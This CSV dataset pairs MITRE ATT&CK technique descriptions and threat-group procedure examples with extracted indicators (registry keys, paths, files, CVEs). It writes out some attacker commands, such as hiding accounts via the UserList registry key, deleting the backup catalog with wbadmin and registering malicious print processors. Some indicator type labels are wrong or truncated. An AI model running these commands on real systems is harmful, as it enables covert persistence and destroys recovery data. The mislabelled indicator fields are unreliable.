tech_id,tech_name,text,section,ioc,ioc_value
T1564.002,Hidden Users,"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.    In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value  Hide500Users  to  TRUE  in the  /Library/Preferences/com.apple.loginwindow  plist file.   [1]    Every user has a userID associated with it. When the  Hide500Users  key value is set to  TRUE , users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the  dscl  utility to create hidden user accounts by setting the  IsHidden  attribute to  1 . Adversaries can also hide a user’s home folder by changing the  chflags  to hidden.   [2]       Adversaries may similarly hide user accounts in Windows. Adversaries can set the  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList  Registry key value to  0  for a specific user to prevent that user from being listed on the logon screen.   [3]      [4]      On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the  gsettings  command (ex:  sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true ).   [5]    Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",Description,registry-key,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
T1564.002,Hidden Users,"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.    In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value  Hide500Users  to  TRUE  in the  /Library/Preferences/com.apple.loginwindow  plist file.   [1]    Every user has a userID associated with it. When the  Hide500Users  key value is set to  TRUE , users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the  dscl  utility to create hidden user accounts by setting the  IsHidden  attribute to  1 . Adversaries can also hide a user’s home folder by changing the  chflags  to hidden.   [2]       Adversaries may similarly hide user accounts in Windows. Adversaries can set the  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList  Registry key value to  0  for a specific user to prevent that user from being listed on the logon screen.   [3]      [4]      On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the  gsettings  command (ex:  sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true ).   [5]    Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",Description,path,/Library/Preferences/com.apple
T1564.002,Hidden Users,"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.    In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value  Hide500Users  to  TRUE  in the  /Library/Preferences/com.apple.loginwindow  plist file.   [1]    Every user has a userID associated with it. When the  Hide500Users  key value is set to  TRUE , users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the  dscl  utility to create hidden user accounts by setting the  IsHidden  attribute to  1 . Adversaries can also hide a user’s home folder by changing the  chflags  to hidden.   [2]       Adversaries may similarly hide user accounts in Windows. Adversaries can set the  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList  Registry key value to  0  for a specific user to prevent that user from being listed on the logon screen.   [3]      [4]      On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the  gsettings  command (ex:  sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true ).   [5]    Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",Description,registry-key,HKLM\SOFTWARE\Microsoft\Windows
T1564.002,Hidden Users,Kimsuky  has run  reg add ‘HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList’ /v  to hide a newly created user.   [6],Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
T1564.002,Hidden Users,Kimsuky  has run  reg add ‘HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList’ /v  to hide a newly created user.   [6],Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows
T1480,Execution Guardrails,NativeZone  can check for the presence of KM.EkeyAlmaz1C.dll and will halt execution unless it is in the same directory as the rest of the malware's components.   [5]      [6],Procedure Examples,file,KM.EkeyAlmaz1C.dll
T1098.002,Additional Email Delegate Permissions,"APT29  added their own devices as allowed IDs for active sync using  Set-CASMailbox , allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.   [9]      [10]      [11]",Procedure Examples,domain,mail.read
T1547.012,Print Processors,"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot.    Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the  AddPrintProcessor  API call with an account that has  SeLoadDriverPrivilege  enabled. Alternatively, a print processor can be registered to the print spooler service by adding the  HKLM\SYSTEM\[CurrentControlSet or ControlSet001]\Control\Print\Environments\[Windows architecture: e.g., Windows x64]\Print Processors\[user defined]\Driver  Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the  GetPrintProcessorDirectory  API call.   [1]    After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.   [2]    The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",Description,registry-key,HKLM\SYSTEM
T1547.012,Print Processors,"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot.    Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the  AddPrintProcessor  API call with an account that has  SeLoadDriverPrivilege  enabled. Alternatively, a print processor can be registered to the print spooler service by adding the  HKLM\SYSTEM\[CurrentControlSet or ControlSet001]\Control\Print\Environments\[Windows architecture: e.g., Windows x64]\Print Processors\[user defined]\Driver  Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the  GetPrintProcessorDirectory  API call.   [1]    After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.   [2]    The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",Description,file,spoolsv.exe
T1547.012,Print Processors,"Earth Lusca  has added the Registry key  HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint"" /v Driver /d ""spool.dll /f  to load malware as a Print Processor.   [3]",Procedure Examples,registry-key,HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint
T1547.012,Print Processors,"Earth Lusca  has added the Registry key  HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint"" /v Driver /d ""spool.dll /f  to load malware as a Print Processor.   [3]",Procedure Examples,path,"/v Driver /d ""spool.dll"
T1547.012,Print Processors,"Earth Lusca  has added the Registry key  HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint"" /v Driver /d ""spool.dll /f  to load malware as a Print Processor.   [3]",Procedure Examples,registry-key,HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows
T1547.012,Print Processors,"Earth Lusca  has added the Registry key  HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint"" /v Driver /d ""spool.dll /f  to load malware as a Print Processor.   [3]",Procedure Examples,file,spool.dll
T1547.012,Print Processors,Gelsemium  can drop itself in  C:\Windows\System32\spool\prtprocs\x64\winprint.dll  to be loaded automatically by the spoolsv Windows service.   [4],Procedure Examples,path,C:\Windows\System32\spool\prtprocs\x64\winprint.dll
T1547.012,Print Processors,Gelsemium  can drop itself in  C:\Windows\System32\spool\prtprocs\x64\winprint.dll  to be loaded automatically by the spoolsv Windows service.   [4],Procedure Examples,file,winprint.dll
T1547.012,Print Processors,The  PipeMon  installer has modified the Registry key  HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors  to install  PipeMon  as a Print Processor.   [2],Procedure Examples,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print
T1547.012,Print Processors,The  PipeMon  installer has modified the Registry key  HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors  to install  PipeMon  as a Print Processor.   [2],Procedure Examples,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows
T1567.001,Exfiltration to Code Repository,"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.   Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",Description,url,https://api.github.com
T1567.001,Exfiltration to Code Repository,"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.   Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",Description,domain,api.github.com
T1027.003,Steganography,MuddyWater  has stored obfuscated JavaScript code in an image file named temp.jpg.   [15],Procedure Examples,file,temp.jpg
T1003.005,Cached Domain Credentials,"Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.   [1]      On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.   [2]    The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires  Password Cracking  to recover the plaintext password.   [3]      With SYSTEM access, the tools/utilities such as  Mimikatz ,  Reg , and secretsdump.py can be used to extract the cached credentials.   Note: Cached credentials for Windows Vista are derived using PBKDF2.   [2]",Description,domain,secretsdump.py
T1574.011,Services Registry Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under  HKLM\SYSTEM\CurrentControlSet\Services . The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,   PowerShell , or  Reg . Access to Registry keys is controlled through access control lists and user permissions.    [1]      [2]      If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).   Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the  FailureCommand  key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.   [3]      [4]      The  Performance  key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.   [5]    If the  Performance  key is not already present and if an adversary-controlled user has the  Create Subkey  permission, adversaries may create the  Performance  key in the service’s Registry tree to point to a malicious DLL.   [6]      Adversaries may also add the  Parameters  key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.   [5]      [7]    Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll .   [2]",Description,registry-key,HKLM\SYSTEM\CurrentControlSet\Services
T1574.011,Services Registry Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under  HKLM\SYSTEM\CurrentControlSet\Services . The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,   PowerShell , or  Reg . Access to Registry keys is controlled through access control lists and user permissions.    [1]      [2]      If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).   Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the  FailureCommand  key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.   [3]      [4]      The  Performance  key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.   [5]    If the  Performance  key is not already present and if an adversary-controlled user has the  Create Subkey  permission, adversaries may create the  Performance  key in the service’s Registry tree to point to a malicious DLL.   [6]      Adversaries may also add the  Parameters  key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.   [5]      [7]    Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll .   [2]",Description,file,sc.exe
T1574.011,Services Registry Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under  HKLM\SYSTEM\CurrentControlSet\Services . The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,   PowerShell , or  Reg . Access to Registry keys is controlled through access control lists and user permissions.    [1]      [2]      If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).   Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the  FailureCommand  key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.   [3]      [4]      The  Performance  key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.   [5]    If the  Performance  key is not already present and if an adversary-controlled user has the  Create Subkey  permission, adversaries may create the  Performance  key in the service’s Registry tree to point to a malicious DLL.   [6]      Adversaries may also add the  Parameters  key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.   [5]      [7]    Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll .   [2]",Description,file,svchost.exe
T1574.011,Services Registry Permissions Weakness,"During  Operation Honeybee , the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into the  svchost.exe  process.   [8]",Procedure Examples,file,ipnet.dll
T1574.011,Services Registry Permissions Weakness,"During  Operation Honeybee , the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into the  svchost.exe  process.   [8]",Procedure Examples,file,svchost.exe
T1547.005,Security Support Provider,"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.   The SSP configuration is stored in two Registry keys:  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages  and  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages . An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.   [1]",Description,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages  and  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security
T1547.005,Security Support Provider,"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.   The SSP configuration is stored in two Registry keys:  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages  and  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages . An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.   [1]",Description,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security
T1547.005,Security Support Provider,"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.   The SSP configuration is stored in two Registry keys:  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages  and  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages . An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.   [1]",Description,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security
T1220,XSL Script Processing,"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.    [1]      Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to  Trusted Developer Utilities Proxy Execution , the Microsoft common line transformation utility binary (msxsl.exe)    [2]    can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.    [3]    Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.    [4]    Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.   [5]      Command-line examples:   [3]      [5]      Another variation of this technique, dubbed ""Squiblytwo"", involves using  Windows Management Instrumentation  to invoke JScript or VBScript within an XSL file.   [6]    This technique can also execute local/remote scripts and, similar to its  Regsvr32 / ""Squiblydoo"" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in  Windows Management Instrumentation  provided they utilize the /FORMAT switch.   [5]      Command-line examples:   [5]      [6]",Description,file,msxsl.exe
T1220,XSL Script Processing,"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.    [1]      Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to  Trusted Developer Utilities Proxy Execution , the Microsoft common line transformation utility binary (msxsl.exe)    [2]    can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.    [3]    Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.    [4]    Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.   [5]      Command-line examples:   [3]      [5]      Another variation of this technique, dubbed ""Squiblytwo"", involves using  Windows Management Instrumentation  to invoke JScript or VBScript within an XSL file.   [6]    This technique can also execute local/remote scripts and, similar to its  Regsvr32 / ""Squiblydoo"" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in  Windows Management Instrumentation  provided they utilize the /FORMAT switch.   [5]      Command-line examples:   [5]      [6]",Description,file,Msxsl.exe
T1220,XSL Script Processing,Cobalt Group  used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.   [8],Procedure Examples,file,msxsl.exe
T1074,Data Staged,Kobalos  can write captured SSH connection credentials to a file under the  /var/run  directory with a  .pid  extension for exfiltration.   [4],Procedure Examples,path,/var/run  directory with a  .pid
T1014,Rootkit,Hildegard  has modified /etc/ld.so.preload to overwrite readdir() and readdir64().   [18],Procedure Examples,path,/etc/ld.so
T1014,Rootkit,Hildegard  has modified /etc/ld.so.preload to overwrite readdir() and readdir64().   [18],Procedure Examples,domain,ld.so
T1014,Rootkit,Rocke  has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.   [22],Procedure Examples,path,/etc/ld.so
T1014,Rootkit,Rocke  has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.   [22],Procedure Examples,domain,ld.so
T1014,Rootkit,"Winnti for Linux  has used a modified copy of the open-source userland rootkit Azazel, named libxselinux.so, to hide the malware's operations and network activity.   [30]",Procedure Examples,domain,libxselinux.so
T1218.014,MMC,"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.   [1]      [2]    MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.   [3]      For example,  mmc C:\Users\foo\admintools.msc /a  will open a custom, saved console msc file in author mode.   [1]    Another common example is  mmc gpedit.msc , which will open the Group Policy Editor application window.    Adversaries may use MMC commands to perform malicious tasks. For example,  mmc wbadmin.msc delete catalog -quiet  deletes the backup catalog on the system (i.e.  Inhibit System Recovery ) without prompts to the user (Note:  wbadmin.msc  may only be present by default on Windows Server operating systems).   [4]      [5]      Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a  Component Object Model  class object.   [6]    Then, adversaries may create custom consoles with the ""Link to Web Address"" snap-in that is linked to the malicious CLSID subkey.   [7]    Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command:  mmc.exe -Embedding C:\path\to\test.msc .   [8]",Description,path,C:\path\to\test.msc
T1218.014,MMC,"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.   [1]      [2]    MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.   [3]      For example,  mmc C:\Users\foo\admintools.msc /a  will open a custom, saved console msc file in author mode.   [1]    Another common example is  mmc gpedit.msc , which will open the Group Policy Editor application window.    Adversaries may use MMC commands to perform malicious tasks. For example,  mmc wbadmin.msc delete catalog -quiet  deletes the backup catalog on the system (i.e.  Inhibit System Recovery ) without prompts to the user (Note:  wbadmin.msc  may only be present by default on Windows Server operating systems).   [4]      [5]      Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a  Component Object Model  class object.   [6]    Then, adversaries may create custom consoles with the ""Link to Web Address"" snap-in that is linked to the malicious CLSID subkey.   [7]    Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command:  mmc.exe -Embedding C:\path\to\test.msc .   [8]",Description,path,C:\Users\foo\admintools.msc
T1218.014,MMC,"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.   [1]      [2]    MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.   [3]      For example,  mmc C:\Users\foo\admintools.msc /a  will open a custom, saved console msc file in author mode.   [1]    Another common example is  mmc gpedit.msc , which will open the Group Policy Editor application window.    Adversaries may use MMC commands to perform malicious tasks. For example,  mmc wbadmin.msc delete catalog -quiet  deletes the backup catalog on the system (i.e.  Inhibit System Recovery ) without prompts to the user (Note:  wbadmin.msc  may only be present by default on Windows Server operating systems).   [4]      [5]      Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a  Component Object Model  class object.   [6]    Then, adversaries may create custom consoles with the ""Link to Web Address"" snap-in that is linked to the malicious CLSID subkey.   [7]    Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command:  mmc.exe -Embedding C:\path\to\test.msc .   [8]",Description,file,mmc.exe
T1070.001,Clear Windows Event Logs,HermeticWiper  can overwrite the  C:\Windows\System32\winevt\Logs  file on a targeted system.   [15],Procedure Examples,path,C:\Windows\System32\winevt\Logs
T1587.001,Malware,"Cleaver  has created customized tools and payloads for functions including ARP poisoning, encryption, credential dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and SMB communications, network interface sniffing, and keystroke logging.   [11]",Procedure Examples,domain,asp.net
T1587.001,Malware,Kimsuky  has developed its own unique malware such as MailFetch.py for use in operations.   [15]      [16],Procedure Examples,domain,mailfetch.py
T1190,Exploit Public-Facing Application,"APT28  has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites.   [8]      [9]",Procedure Examples,cve,CVE-2020-17144
T1190,Exploit Public-Facing Application,"APT28  has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites.   [8]      [9]",Procedure Examples,cve,CVE-2020-0688
T1190,Exploit Public-Facing Application,"APT29  has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access. They have also exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.   [10]      [11]      [12]",Procedure Examples,cve,CVE-2019-11510
T1190,Exploit Public-Facing Application,"APT29  has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access. They have also exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.   [10]      [11]      [12]",Procedure Examples,cve,CVE-2020-0688
T1190,Exploit Public-Facing Application,"APT29  has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access. They have also exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.   [10]      [11]      [12]",Procedure Examples,cve,CVE-2018-13379
T1190,Exploit Public-Facing Application,"APT29  has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access. They have also exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.   [10]      [11]      [12]",Procedure Examples,cve,CVE-2019-9670
T1190,Exploit Public-Facing Application,"APT29  has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access. They have also exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.   [10]      [11]      [12]",Procedure Examples,cve,CVE-2019-19781
T1190,Exploit Public-Facing Application,"APT41  exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.   [14]",Procedure Examples,cve,CVE-2020-10189
T1190,Exploit Public-Facing Application,"APT41  exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.   [14]",Procedure Examples,cve,CVE-2019-19781
T1190,Exploit Public-Facing Application,"BackdoorDiplomacy  has exploited CVE-2020-5902, an F5 BIP-IP vulnerability, to drop a Linux backdoor.  BackdoorDiplomacy  has also exploited mis-configured Plesk servers.   [17]",Procedure Examples,cve,CVE-2020-5902
T1190,Exploit Public-Facing Application,"BlackTech  has exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0, CVE-2017-7269, in order to establish a new HTTP or command and control (C2) server.   [18]",Procedure Examples,cve,CVE-2017-7269
T1190,Exploit Public-Facing Application,"Blue Mockingbird  has gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX.   [19]",Procedure Examples,domain,asp.net
T1190,Exploit Public-Facing Application,"Blue Mockingbird  has gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX.   [19]",Procedure Examples,cve,CVE-2019-18935
T1190,Exploit Public-Facing Application,"Dragonfly  has conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs.   [20]",Procedure Examples,cve,CVE-2020-0688
T1190,Exploit Public-Facing Application,"Dragonfly  has conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs.   [20]",Procedure Examples,cve,CVE-2019-19781
